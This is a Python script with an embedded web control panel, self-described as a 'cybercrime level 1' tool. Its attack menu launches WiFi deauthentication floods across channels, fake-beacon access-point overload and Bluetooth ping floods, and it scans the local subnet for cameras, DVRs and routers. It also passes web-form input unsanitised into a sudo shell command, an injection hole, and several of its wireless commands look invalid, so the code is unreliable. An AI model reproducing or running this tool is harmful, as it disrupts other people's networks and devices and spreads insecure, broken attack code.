#!/usr/bin/env python3
"""
mereta alpha v2.1 - cybercrime level 1
with add new network & wifi control
"""

import os
import time
import subprocess
import threading
import json
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# konfigurasi
# ============================================

interface = "wlan0"
attack_running = False
current_attack = "idle"
scan_results = []
devices_found = []
bluetooth_running = False

# ============================================
# fungsi wifi control & add network
# ============================================

def get_wifi_status():
    result = subprocess.run(["nmcli", "radio", "wifi"], capture_output=True, text=True)
    return "enabled" in result.stdout

def set_wifi_on(enable):
    if enable:
        os.system("nmcli radio wifi on")
    else:
        os.system("nmcli radio wifi off")

def add_wifi_network(ssid, password):
    """tambah jaringan wifi baru"""
    try:
        # buat config file
        config = f"""
network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
        with open("/tmp/new_wifi.conf", "w") as f:
            f.write(config)
        
        # tambahkan ke wpa_supplicant
        os.system("sudo wpa_passphrase '{}' '{}' >> /etc/wpa_supplicant/wpa_supplicant.conf".format(ssid, password))
        os.system("sudo wpa_cli reconfigure")
        return True
    except:
        return False

def enable_ap_mode(ssid="MERETA", password="12345678"):
    """jadikan pi sebagai access point"""
    os.system("sudo nmcli dev wifi hotspot ifname wlan0 ssid MERETA password 12345678")
    return True

def scan_wifi_networks():
    global scan_results
    scan_results = []
    try:
        os.system(f"sudo iw dev {interface} scan > /tmp/scan_result 2>&1 &")
        time.sleep(2)
        with open("/tmp/scan_result", "r") as f:
            content = f.read()
        
        lines = content.split('\n')
        ssid = ""
        bssid = ""
        signal = ""
        
        for line in lines:
            if "bssid" in line.lower() or "bss" in line:
                parts = line.split()
                if len(parts) > 1:
                    bssid = parts[1]
            elif "ssid:" in line.lower():
                ssid = line.split("ssid:")[1].strip()
                if ssid and ssid != "" and bssid:
                    scan_results.append({"ssid": ssid, "bssid": bssid, "signal": signal})
                    ssid = ""
                    bssid = ""
            elif "signal:" in line.lower():
                parts = line.split()
                if len(parts) > 1:
                    signal = parts[1]
        return scan_results
    except:
        return []

def device_scan():
    global devices_found
    devices_found = []
    
    # arp scan
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "(" in line and ")" in line:
                ip = line.split("(")[1].split(")")[0]
                mac = line.split("at ")[1].split(" ")[0] if "at " in line else "unknown"
                if ip.startswith("192.168"):
                    devices_found.append({"ip": ip, "mac": mac, "status": "online"})
    except:
        pass
    
    # ping sweep parallel
    base_ip = "192.168.1"
    alive = []
    
    def ping(ip):
        if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
            alive.append(ip)
    
    threads = []
    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    # deteksi tipe device
    for ip in alive[:30]:
        device_type = "unknown"
        for port, dtype in [(80, "web"), (22, "ssh"), (23, "router"), 
                            (443, "https"), (554, "cctv"), (37777, "cctv"), 
                            (8000, "dvr"), (8080, "proxy")]:
            if os.system(f"nc -zv {ip} {port} 2>&1 > /dev/null") == 0:
                device_type = dtype
                break
        devices_found.append({"ip": ip, "type": device_type, "status": "alive"})
    
    return devices_found

def start_deauth_brutal(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "deauth_brutal"
    end = time.time() + duration
    
    while attack_running and time.time() < end:
        os.system(f"sudo iw dev {interface} set bitrates legacy-2.4 1")
        for _ in range(1000):
            os.system(f"sudo iw dev {interface} send deauth -c 6 -b ff:ff:ff:ff:ff:ff")
        time.sleep(0.005)
    
    if attack_running:
        current_attack = "idle"

def start_all_channels(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "all_channels"
    end = time.time() + duration
    channels = [1,2,3,4,5,6,7,8,9,10,11]
    
    def attack_channel(ch):
        while attack_running and time.time() < end:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(500):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
            time.sleep(0.01)
    
    threads = []
    for ch in channels:
        t = threading.Thread(target=attack_channel, args=(ch,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    if attack_running:
        current_attack = "idle"

def start_ap_overload(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "ap_overload"
    end = time.time() + duration
    ssids = [f"fake_{i}" for i in range(50)]
    
    while attack_running and time.time() < end:
        for ssid in ssids:
            os.system(f"sudo iw dev {interface} mgmt beacon -c 6 -s '{ssid}' -w 100")
        time.sleep(0.05)
    
    if attack_running:
        current_attack = "idle"

def start_bluetooth_brutal(duration=60):
    global attack_running, current_attack, bluetooth_running
    attack_running = True
    current_attack = "bluetooth_brutal"
    bluetooth_running = True
    end = time.time() + duration
    
    while attack_running and bluetooth_running and time.time() < end:
        os.system("sudo hciconfig hci0 reset 2>/dev/null")
        os.system("sudo hciconfig hci0 down 2>/dev/null")
        os.system("sudo hciconfig hci0 up 2>/dev/null")
        for _ in range(10):
            os.system("sudo hcitool scan 2>/dev/null &")
        os.system("sudo l2ping -s 600 -f ff:ff:ff:ff:ff:ff 2>/dev/null &")
        time.sleep(0.1)
    
    bluetooth_running = False
    if attack_running:
        current_attack = "idle"

def stop_all():
    global attack_running, current_attack, bluetooth_running
    attack_running = False
    current_attack = "idle"
    bluetooth_running = False
    os.system("sudo pkill -9 aireplay-ng 2>/dev/null")
    os.system("sudo pkill -9 arpspoof 2>/dev/null")
    os.system("sudo pkill -9 l2ping 2>/dev/null")
    os.system("sudo pkill -9 hcitool 2>/dev/null")

def get_network_info():
    try:
        result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
        gateway = result.stdout.split()[2] if result.stdout else "unknown"
        return {"gateway": gateway, "wifi_status": get_wifi_status()}
    except:
        return {"gateway": "unknown", "wifi_status": False}

# ============================================
# web server html
# ============================================

html_page = '''<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>mereta alpha v2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:12px;color:#cc0000;padding:15px;}
.container{max-width:550px;margin:0 auto;border:1px solid #cc0000;padding:20px;background:#fff;}
.header{text-align:center;margin-bottom:20px;border-bottom:1px solid #cc0000;padding-bottom:12px;}
.title{font-size:26px;letter-spacing:3px;font-weight:300;}
.subtitle{font-size:9px;color:#cc0000;margin-top:5px;}
.warning{background:#ffeeee;border-left:3px solid #cc0000;padding:8px;margin-bottom:15px;font-size:10px;}
.section{margin-bottom:18px;}
.section-title{font-size:10px;margin-bottom:6px;color:#cc0000;letter-spacing:1px;}
input,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:6px 10px;font-family:'courier new',monospace;font-size:11px;outline:none;}
input{width:160px;}
button{cursor:pointer;margin:2px;}
button:hover{background:#cc0000;color:#fff;}
.result-area{margin-top:8px;padding:6px;border:1px solid #ffcccc;min-height:50px;max-height:120px;overflow-y:auto;font-size:10px;}
.result-line{color:#cc0000;margin:2px 0;}
.footer{margin-top:15px;padding-top:8px;border-top:1px solid #ffcccc;font-size:9px;}
.status{color:#cc0000;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="title">mereta alpha v2</div>
<div class="subtitle">cybercrime level 1 - with add network</div>
</div>
<div class="warning">
[!] extreme danger - total destruction mode
</div>

<div class="section">
<div class="section-title">> wifi control</div>
<button id="wifionbtn">wifi on</button>
<button id="wifioffbtn">wifi off</button>
<button id="apbtn">ap mode (mereta)</button>
<div id="wifiStatus" class="result-area">checking...</div>
</div>

<div class="section">
<div class="section-title">> add new network</div>
<input type="text" id="newssid" placeholder="ssid"><br>
<input type="password" id="newpwd" placeholder="password"><br>
<button id="addnetbtn">add network</button>
<div id="addResult" class="result-area"></div>
</div>

<div class="section">
<div class="section-title">> wifi scan</div>
<button id="scanbtn">scan networks</button>
<div id="scanresult" class="result-area">not scanned</div>
</div>

<div class="section">
<div class="section-title">> device scanner</div>
<button id="devscanbtn">scan devices</button>
<div id="devresult" class="result-area">not scanned</div>
</div>

<div class="section">
<div class="section-title">> attack menu</div>
<div style="display:flex;flex-wrap:wrap;gap:5px;margin-bottom:8px;">
<button id="deauthbtn">deauth brutal</button>
<button id="allchbtn">all channels</button>
<button id="apoverbtn">ap overload</button>
<button id="btbtn">bt brutal</button>
<button id="stopbtn" style="background:#cc0000;color:#fff;">stop</button>
</div>
<div>duration: <input type="number" id="duration" value="30" min="5" max="300"> seconds</div>
<div id="attackstatus" class="result-area" style="margin-top:8px;">idle</div>
</div>

<div class="footer">
<span class="status" id="status">ready</span><br>
<span class="red">*** total destruction mode ***</span>
</div>
</div>

<script>
const wifionbtn = document.getElementById('wifionbtn');
const wifioffbtn = document.getElementById('wifioffbtn');
const apbtn = document.getElementById('apbtn');
const addnetbtn = document.getElementById('addnetbtn');
const scanbtn = document.getElementById('scanbtn');
const devscanbtn = document.getElementById('devscanbtn');
const deauthbtn = document.getElementById('deauthbtn');
const allchbtn = document.getElementById('allchbtn');
const apoverbtn = document.getElementById('apoverbtn');
const btbtn = document.getElementById('btbtn');
const stopbtn = document.getElementById('stopbtn');
const duration = document.getElementById('duration');
const wifiStatus = document.getElementById('wifiStatus');
const addResult = document.getElementById('addResult');
const scanresult = document.getElementById('scanresult');
const devresult = document.getElementById('devresult');
const attackstatus = document.getElementById('attackstatus');
const statusspan = document.getElementById('status');

async function fetchJson(url, opts={}) {
    const res = await fetch(url, opts);
    return res.json();
}

async function updateStatus() {
    try {
        const data = await fetchJson('/api/status');
        attackstatus.innerHTML = data.current_attack === 'idle' ? 'idle' : `<span class="red">${data.current_attack} active</span>`;
    } catch(e) {}
}

wifionbtn.onclick = async () => {
    await fetch('/api/wifi/on');
    wifiStatus.innerHTML = '<div class="result-line">wifi turned on</div>';
    updateStatus();
};

wifioffbtn.onclick = async () => {
    await fetch('/api/wifi/off');
    wifiStatus.innerHTML = '<div class="result-line">wifi turned off (bt jammer still works)</div>';
    updateStatus();
};

apbtn.onclick = async () => {
    await fetch('/api/ap');
    wifiStatus.innerHTML = '<div class="result-line">ap mode active: MERETA (12345678)</div>';
};

addnetbtn.onclick = async () => {
    const ssid = document.getElementById('newssid').value;
    const pwd = document.getElementById('newpwd').value;
    if(!ssid || !pwd) {
        addResult.innerHTML = '<div class="result-line">isi ssid & password</div>';
        return;
    }
    addResult.innerHTML = '<div class="result-line">adding...</div>';
    const data = await fetchJson('/api/add', {
        method: 'POST',
        body: JSON.stringify({ssid, pwd})
    });
    addResult.innerHTML = `<div class="result-line">${data.status}</div>`;
    document.getElementById('newssid').value = '';
    document.getElementById('newpwd').value = '';
};

scanbtn.onclick = async () => {
    scanresult.innerHTML = '<div class="result-line">scanning...</div>';
    const data = await fetchJson('/api/scan');
    if(data.networks && data.networks.length > 0) {
        let html = `<div class="result-line">${data.networks.length} networks:</div>`;
        for(let n of data.networks.slice(0,15)) {
            html += `<div class="result-line">  > ${n.ssid} - ${n.bssid}</div>`;
        }
        scanresult.innerHTML = html;
    } else {
        scanresult.innerHTML = '<div class="result-line">no networks</div>';
    }
};

devscanbtn.onclick = async () => {
    devresult.innerHTML = '<div class="result-line">scanning devices...</div>';
    const data = await fetchJson('/api/devices');
    if(data.devices && data.devices.length > 0) {
        let html = `<div class="result-line">${data.devices.length} devices:</div>`;
        for(let d of data.devices.slice(0,20)) {
            const icon = d.type === 'cctv' ? '📹' : d.type === 'router' ? '📡' : '💻';
            html += `<div class="result-line">  ${icon} ${d.ip} - ${d.type}</div>`;
        }
        devresult.innerHTML = html;
    } else {
        devresult.innerHTML = '<div class="result-line">no devices</div>';
    }
};

deauthbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<span class="red">starting deauth...</span>';
    await fetch('/api/attack/deauth?duration=' + dur);
    attackstatus.innerHTML = `<span class="red">deauth brutal - ${dur}s</span>`;
    setTimeout(updateStatus, dur * 1000);
};

allchbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<span class="red">starting all channels...</span>';
    await fetch('/api/attack/allchannels?duration=' + dur);
    attackstatus.innerHTML = `<span class="red">all channels - ${dur}s</span>`;
    setTimeout(updateStatus, dur * 1000);
};

apoverbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<span class="red">starting ap overload...</span>';
    await fetch('/api/attack/apoverload?duration=' + dur);
    attackstatus.innerHTML = `<span class="red">ap overload - ${dur}s</span>`;
    setTimeout(updateStatus, dur * 1000);
};

btbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<span class="red">starting bt brutal...</span>';
    await fetch('/api/attack/bluetooth?duration=' + dur);
    attackstatus.innerHTML = `<span class="red">bt brutal - ${dur}s</span>`;
    setTimeout(updateStatus, dur * 1000);
};

stopbtn.onclick = async () => {
    await fetch('/api/stop');
    attackstatus.innerHTML = 'stopped - idle';
    updateStatus();
};

setInterval(updateStatus, 2000);
updateStatus();
</script>
</body>
</html>'''

class handler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_page.encode())
        
        elif self.path == '/api/status':
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'current_attack': current_attack, 'running': attack_running}).encode())
        
        elif self.path == '/api/wifi/on':
            set_wifi_on(True)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"on"}')
        
        elif self.path == '/api/wifi/off':
            set_wifi_on(False)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"off"}')
        
        elif self.path == '/api/ap':
            enable_ap_mode()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"ap_mode_on"}')
        
        elif self.path == '/api/scan':
            networks = scan_wifi_networks()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'networks': networks}).encode())
        
        elif self.path == '/api/devices':
            devices = device_scan()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'devices': devices}).encode())
        
        elif self.path.startswith('/api/attack/deauth'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_deauth_brutal, args=(duration,)).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"started"}')
        
        elif self.path.startswith('/api/attack/allchannels'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_all_channels, args=(duration,)).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"started"}')
        
        elif self.path.startswith('/api/attack/apoverload'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_ap_overload, args=(duration,)).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"started"}')
        
        elif self.path.startswith('/api/attack/bluetooth'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_bluetooth_brutal, args=(duration,)).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"started"}')
        
        elif self.path == '/api/stop':
            stop_all()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"stopped"}')
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/add':
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length))
            ssid = data.get('ssid', '')
            pwd = data.get('pwd', '')
            if ssid and pwd:
                add_wifi_network(ssid, pwd)
                self.send_response(200)
                self.send_header('content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': f'network {ssid} added'}).encode())
            else:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

if __name__ == '__main__':
    os.system('clear')
    print('\033[91m╔════════════════════════════════════════════╗')
    print('║              mereta alpha v2.1                ║')
    print('║         cybercrime level 1 - web              ║')
    print('║        with add network & wifi control        ║')
    print('╚════════════════════════════════════════════╝\033[0m')
    
    os.system(f"sudo ifconfig {interface} up 2>/dev/null")
    
    local_ip = get_ip()
    print(f'\n\033[91m[!]\033[0m server: http://{local_ip}:8080')
    print(f'\033[91m[!]\033[0m fitur: add network | wifi on/off | ap mode')
    print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
    
    server = HTTPServer(('0.0.0.0', 8080), handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n\033[91m[!]\033[0m terminated')
        server.shutdown() 
